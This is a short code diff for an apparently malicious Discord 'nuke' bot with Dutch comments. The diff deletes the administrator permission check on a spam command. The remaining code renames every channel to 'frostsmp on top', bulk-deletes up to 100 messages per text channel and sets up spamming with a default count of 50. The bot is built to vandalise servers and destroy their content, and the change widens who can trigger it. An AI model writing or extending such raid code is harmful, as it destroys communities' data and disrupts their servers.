@@ -26,10 +26,7 @@ client.on('messageCreate', async message => {
     const args = message.content.slice(5).trim().split(/ +/);
     const spamAmount = parseInt(args[0]) || 50;
 
-    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
-        return message.reply("❌ Administrator rechten nodig!").then(m => setTimeout(() => m.delete().catch(() => {}), 2000));
-    }
-
+    // Commando meteen verwijderen
     message.delete().catch(() => {});
 
     try {
@@ -65,10 +62,8 @@ client.on('messageCreate', async message => {
 
     const promises = allChannels.map(async (channel) => {
         try {
-            // Hernoemen naar frostsmp on top
             await channel.setName("frostsmp on top");
 
-            // Alleen bij text channels: spam
             if (channel.type === ChannelType.GuildText) {
                 await channel.bulkDelete(100, true).catch(() => {});
 
